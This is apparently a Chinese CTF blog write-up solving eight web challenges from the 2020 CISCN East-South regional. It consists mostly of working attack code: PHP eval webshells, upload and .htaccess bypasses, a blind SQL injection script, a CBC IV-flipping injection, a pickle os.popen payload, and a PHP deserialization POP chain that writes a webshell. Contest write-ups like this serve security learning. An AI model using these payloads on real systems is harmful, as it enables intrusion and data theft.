date: 2020-10-04
categories:
- 比赛
tags:
- ctf
- wp
- web
title: 2020 ciscn 华东南 web
---
# 2020 CISCN 华东南赛区

## web1



```
zip -r is useful, and don't forget /var/www/html/***********/cat.php
```

访问www.zip拿到源码

利用`$msg = sprintf($msg, $value);     `打印文件上传位置`me0w_mE0w_miA0`

访问`me0w_mE0w_miA0/cat.php`提示vim,拿到源码



cat.php

```php
<?php
error_reporting(0);
include('../waf.php');

session_start();
/*Login check*/
if(!$_SESSION['islogin'])
{
    die('Who are you?');

}else{
    //class is waf~
    echo "<h4 align='center'>Hello,ctfer</h4>";
    echo "<h4 align='center'>But I am only a little cat......really?</h4>";
    echo '<br><div align="center"><img src="../images/cat2.jpg" align="center" /></div></br>';
    $a=new waf();
    spl_autoload_register();

    if(isset($_COOKIE["filenames"]))
    {
        $a->data=$_COOKIE["filenames"];
        $a->upload_check();
        echo "<h3 align='center'>The Winning Formula is complete!</h3>";
        $filenames=unserialize($_COOKIE["filenames"]);
    }else{
        $filenames='kee1ongz.meow';
        file_put_contents($filenames,' Meow~meow,meow~');
    }
}

?>

```



spl_autoload_register();没有任何参数的情况下调用spl_autoload();

>- `class_name`
>
> 
>
>- `file_extensions`
>
> 在默认情况下，本函数先将类名转换成小写，再在小写的类名后加上 .inc       或 .php 的扩展名作为文件名，然后在所有的包含路径(include paths)中检查是否存在该文件。 



上传fffffffffffuck.inc

```
<?php 
	class fffffffffffuck{
		public function __wakeup(){
			eval($_POST[1]);
		}
	}
```



反序列化:`O:13:"ffffffffffuck":0:[]`，将{}换为:`[]`虽然反序列化失败，但是还是调用了`__wakeup`

拿到flag:`ciscn{keQXj78JHVUKjssqgD}`



## web2

提示source.php,composer

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
    if($_SERVER['REMOTE_ADDR'] === '127.0.0.1'){
        $content = file_get_contents('php://filter/read=convert.base64-encode/resource=file:///var/www/html/excel.php');
        file_get_contents('http://'.$_GET['ip'].'/?'.$content);
    }
    else{
        die('only for localhost');
    }
?>
```

composer.json

```
{
    "require": {
        "phpoffice/phpspreadsheet": "1.5.0"
    }
}
```



hint给你excel.php的源码

```php
<?php
error_reporting(0);
require 'vendor/autoload.php';
$r = \PhpOffice\PhpSpreadsheet\IOFactory::createReader('Xlsx');
$r->setReadDataOnly(TRUE);
$fileInfo = $_FILES["filename"];
$filePath = $fileInfo["tmp_name"];
try {
$data = $r->load($filePath)->getSheet(0)->toArray(); 
}
catch (Exception $e) {
die('illegal xlsx file!');
}
$s = '';
$s = $s.'<table>';
foreach($data as $a)
    {
    $s = $s.'<tr>';
    foreach($a as $i)
    {
        $s = $s."<td style=\"text-align:center\"><h2>".$i."</h2></td>";
    }
    $s = $s.'</tr>';
    }
$s = $s.'</table>';
stream_wrapper_unregister('php');
chdir('users/');
$fd = (isset($_SERVER['HTTP_X_FORWARDED_FOR'])?$_SERVER['HTTP_X_FORWARDED_FOR']:$_SERVER['REMOTE_ADDR']);
mkdir($fd);
//data:
chdir($fd);
file_put_contents('profile',$s);
$f = basename(getcwd()).'/profile';
//data:,/profile
chdir('..');
if(!stripos(file_get_contents($f),'<?') && !stripos(file_get_contents($f),'php')) {
	include($f);
}
else die('no!');
?>


```

file_get_contents在处理data:,xxxxxx时会直接取xxxxxx
而include会包含文件名为data:,xxxxxx的文件

但是我们无法直接创建`data:`的文件夹

先用`./data:`创建`data:`文件夹

再用`data:`来绕过`if(!stripos(file_get_contents($f),'<?') && !stripos(file_get_contents($f),'php'))`



## web3

www.zip直接下载，翻源码审计。

登录这边看这login.php构造一下符合正则规则的参数就好了，登了取下sessionid

然后qr.php里，sql注入明显的点，直接拼接的，`$data`来自于扫描二维码得到的数据，二维码里是个json：`{"id":"xxxx"}`。

```php
$sql="insert into record(p_id, userid)values ('".$data['id']."','".$user->getCardID()."');";
```

写盲注脚本爆破一下：

```python
import requests, time
import qrcode
from requests.adapters import HTTPAdapter

SQL = "(select group_concat(flag) from flag)"
GETCONTENT = "'or(if( ascii(substr((" + SQL + "),%d,1)) <= %d, sleep(5), 0))or'"
GETLENGTH = "'or(if( length((" + SQL + ")) <= %d, sleep(5), 0))or'"

THRESHOLD = 5
STRLEN = 32

session = requests.Session()

session.mount('http://', HTTPAdapter(max_retries=10))


def guess(payload, strpos=None):
    l = 0
    r = 255

    while l < r:
        mid = (l+r)//2
        if strpos is None:
            sql = payload % (mid)
        else:
            sql = payload % (strpos, mid)

        if check(sql) == True:
            r = mid
            print('guess <=', r)
        else:
            l = mid + 1
            print('guess >', l)
    return l


def check(payload):

    qr = qrcode.make('{"id":"' + payload + '"}')
    qr.save('qr.png')
    start = time.perf_counter()
    x = session.post(
        url='http://172.20.6.103/qr.php',
        cookies={
            'PHPSESSID': 'fe940a8329992285f77487f96c575d29'
        },
        files={
            "file": open("qr.png", "rb"),
            "Content-Type": "application/octet-stream",
            "Content-Disposition": "form-data",
            "filename": "qr.png"
        },
        timeout=(2, 8)
    )
    end = time.perf_counter()
    print(payload, end-start)
    if end-start > THRESHOLD:
        return True
    else:
        return False


def getlength():
    global STRLEN
    STRLEN = guess(GETLENGTH)
    print('LEN:', STRLEN)


def getcontent():
    content = ''
    for strpos in range(1, STRLEN+1):
        ch = guess(GETCONTENT, strpos)

        content += chr(ch)
        print('CHR:', chr(ch), 'CONTENT:', content)


if __name__ == '__main__':
    getlength()
    getcontent()
```



## web4



```
<?php
class GetPass
{}
class Upload
{}
$y1ng = new GetPass;
$y1ng->abandon = new GetPass;
$y1ng->abandon->abandon =new Upload;
$y1ng->abandon->boring ="1";
$y1ng->abandon->code ="1";

$y1ng->boring = 'read';
$y1ng->code = 'hidden';

$c = new GetPass;
$c->abandon = new GetPass;
$c->abandon->abandon =new Upload;
$c->abandon->boring ="1";
$c->abandon->code ="1";

$c->boring = 'read';
$c->code = this;

$ser = serialize([$y1ng,$c]);
var_dump(urlencode($ser));
```

拿到pass=ob_end_clean_is_surplus



文件上传与网上某题相近

exp.py

```python
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
    phpfile = open(filename, 'wb') 

    phpfile.write(script.encode('utf-16be'))
    phpfile.write(SIZE_HEADER)

    phpfile.close()

def generate_htacess():
    htaccess = open('.htaccess', 'wb')

    htaccess.write(SIZE_HEADER)
    htaccess.write(b'AddType application/x-httpd-php .fuck\n')
    htaccess.write(b'php_value zend.multibyte 1\n')
    htaccess.write(b'php_value zend.detect_unicode 1\n')
    htaccess.write(b'php_value display_errors 1\n')

    htaccess.close()
generate_htacess()
generate_php_file("webshell.fuck", "<?php eval($_POST[1]); ?>")

```

分别上传webshell.fuck,还有.htaccess拿到flag



## web5

```
ccopy_reg
_reconstructor
p0
(c__main__
webSite
p1
c__builtin__
object
p2
Ntp3
Rp4
(dp5
Vname
p6
c__builtin__
getattr
(cos
popen
(S'dir'
tRS'read'
tR(NtRp7
sVdescribe
p8
V2
p9
sb.
```

提权没环境复现

## web6

```python
import requests
url="http://172.20.6.106:80/"
burp0_url = "http://172.20.6.106:80/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://172.20.6.106", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary6ssqFd6DiMBBDuHJ", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://172.20.6.106/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "x-forwarded-for": "127.0.0.1", "Connection": "close"}
burp0_data = "------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"htaccess\"\r\nContent-Type: application/octet-stream\r\n\r\nSetHandler application/x-httpd-php\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n.htaccess\r\n------WebKitFormBoundary6ssqFd6DiMBBDuHJ--\r\n"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Origin": "http://172.20.6.106", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarywAeLpgB3HhSWqVLj", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://172.20.6.106/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "x-forwarded-for": "127.0.0.1", "Connection": "close"}
burp0_data = "------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell1.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\neval($_POST['a']);\n?>\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n2.jpg\r\n------WebKitFormBoundarywAeLpgB3HhSWqVLj--\r\n"
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)


burp0_data={"a":"system('cat /flag.txt');"}
r=requests.post(url+"upload/2.jpg", data=burp0_data)
print(r.text)
```



## web7

浏览一遍代码后发现一个弱类型比较

```php
function getUser()
{

    if (!isset($_SESSION["token"])) {
        return -1;  //not login
    } else if ($_SESSION["token"] == "0") {
        return 0;   //Administrator//0e绕过
    } else {
        $key = base64_decode($_SESSION["token"]);
        $user = explode("|", $key)[0]; //user
        if (!$user) {
            return -1;
        }
        return $user;
    }
}

```

如果我们能令token以0e[0-9]+的格式的话，就可以绕过身份验证机制

而生成token的代码为：

```php
function setUser($username, $password)
{
    $ip = $_SERVER["REMOTE_ADDR"];
    if ($username == 'admin') {
        if ($ip == "::1" || $ip == "127.0.0.1"){
            $_SESSION["token"] = 0;     //Administrator
        }else{
            die('修罗！隐忍！！！');
        }
    } else {
        $key = $username . "|" . $password;
        $_SESSION["token"] = base64_encode($key);
    }
}
```

因为0e[0-9]+是在base64中的所以我们构造：`username=%D1%EDv%EF%BE&password=%D7m%F8`

至此获得admin权限

upload处有个任意文件上传，但是我们不知道admin的上传目录，我们不得不进行sql注入

notes.php处有个神奇的todo:

```php
if (isset($_POST['contents'])) {
    $data = getCache();
    if ($data && $data->contents == $_POST['contents']) {
        $username = $data->username;
        $contents = $data->contents;

    } else {
        $contents = $_POST['contents'];
    }
    if (isset($_POST['cache'])) {
        setCache($username, $contents);
        echo "<script>alert('缓存成功');location.href='index.php'</script>";
    } else {
        setcookie('cache');
        $sql = "INSERT INTO notes (uid, contents, time) VALUES ((select id from users where username = '${username}'), '${contents}', localtime())";
        echo $sql;
        if ($conn->query($sql) === TRUE) {
            echo "<script>alert('提交成功');location.href='index.php'</script>";
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
            //TODO:删掉
        }
    }
}
```

如果我们能控制$data->contents == $_POST['contents']，且可以控制`$data->username`出现引号逃出引号的包围，就可以进行sql注入了。

而我们的缓存的加密函数是：

```php
class CBCCrypt {
    private $iv;
 
    private $encryptKey;

    public function __construct()
    {
        $this->iv = "cbcisfunsoisbase";
        $this->encryptKey =  file_get_contents("secret.txt");
    }

    public function encrypt($encryptStr) {
        $iv = $this->iv;
        $encryptKey = $this->encryptKey;

        $encrypted=openssl_encrypt($encryptStr, 'aes-128-cbc', $encryptKey, true, $iv);
 
        return base64_encode($iv.$encrypted);
 
    }

    public function decrypt($encryptStr) {
        $iv = substr(base64_decode($encryptStr),0,16);
        $encryptKey = $this->encryptKey;
        $encrypted = substr(base64_decode($encryptStr),16);
        $decrypted = openssl_decrypt($encrypted, 'aes-128-cbc', $encryptKey, true, $iv);
        echo openssl_error_string();

        return $decrypted;
    }
}
```

其中$iv是受到我们控制的

![image12048](https://image.3001.net/images/20180228/15198072135832.png!small)

根据cbc加密的原理我们可以知道，通过修改iv从而修改初始的16个字符串

爆破合适iv的脚本:

```php
<?php

function strxor($str1,$str2){
    $res="";
    if(strlen($str1)!==strlen($str2))
        return "";
    for($i=0;$i<strlen($str1);$i++){
        $res.=chr(ord($str1[$i])^ord($str2[$i]));
    }
    return $res;

}
$enc=urldecode("Y2JjaXNmdW5zb2lzYmFzZUDBRfKeIBJYWfSM2WOSqNOLdJ7UM1Nq%2B9zuKSrAr7O8%2B9AtpndZ00OlTIF0qmDsWw%3D%3D");
$cipher = substr($enc,16,16);
$message = substr('{"username":"fucker","contents":"fucker"}',0,16);
$iv = "cbcisfunsoisbase";
$before_xor=strxor($message,$iv);
for($i=0;$i<256;$i++){
    $iv = "cbcisfunsoisbas".chr($i);
    $result = strxor($iv,$before_xor);
    if(strpos($result,"'")!==FALSE){
        echo urlencode($iv);
        echo "\n".$result;
    }
}
```



```python
import requests
import base64
import urllib
import random
session = requests.session()


def reg(session,username):
    burp0_url = "http://100.100.1.5:80/ctf/register.php"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://100.100.1.5", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://100.100.1.5/ctf/register.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = {"username": "fuc"+username, "password": "fucker", "submit": "\xe6\xb3\xa8\xe5\x86\x8c"}
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if "注册成功" in r.text:
        return True
    else:
        return False

def cache(session):
    burp0_url = "http://100.100.1.5:80/ctf/notes.php"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://100.100.1.5", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://100.100.1.5/ctf/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = {"contents": "fffffffffffffffffffffffffffffffffff", "cache": ''}
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if "缓存成功" in r.text:
        return True
    return False

def submit(session,cookies):
    burp0_url = "http://100.100.1.5:80/ctf/notes.php"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://100.100.1.5", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://100.100.1.5/ctf/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = {"contents": "fffffffffffffffffffffffffffffffffff", "submit": ''}
    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=None, overwrite=True)
    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)
    return r
def sqlinj(sql):
    reg(session,sql)
    cache(session)
    cookie = session.cookies.get_dict()
    cookie["cache"]=urllib.parse.quote_plus(str(base64.b64encode(b"cbcisfunsoisbas\x21"+base64.b64decode(urllib.parse.unquote(cookie["cache"]))[16:]),encoding="ascii"))
    print(cookie)
    r=submit(session,cookie)
    return r
sql="or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd"
r=sqlinj(sql)
print(r.text)
if "提交成功" not in r.text:
    print(r.text)
```





上传名为file的文件，得到config/admin/secretpath/profile

结合`include "config/${_SESSION['token']}/profile";`从而getshell

token是base64编码，因此可以精心构造出admin/secretpath

由于没有题目环境便无法验证



## web8

网络上找到了一个payload:http://igml.top/2020/08/21/2020-ciscn/

```php
<?php

namespace DB\Jig {
    class Mapper
    {
        protected $db;
        protected $file = 'gmmml.php';
        protected $document = '<?php @eval($_POST[gml]);?>';

        function __construct($db)
        {
            $this->db = $db;
        }
    }
}

namespace DB {
    class Jig
    {
        protected $format = 0;
        protected $dir = './';
    }
}

namespace CLI {
    class Agent
    {
        protected $server;

        function __construct($server)
        {
            $this->server = $server;
        }
    }

    class WS
    {
        protected $events;

        function __construct($events)
        {
            $this->events = $events;
        }
    }
}

namespace {
    class F3
    {
        public $events;

        function __construct($events)
        {
            $this->events = $events;
        }
    }

    $a = new DB\Jig();
    $b = new DB\Jig\Mapper($a);
    $c = new F3(array('disconnect' => array($b, "insert")));
    $d = new CLI\Agent($c);
    $e = new CLI\WS($d);
    echo urlencode(serialize($e));

}
```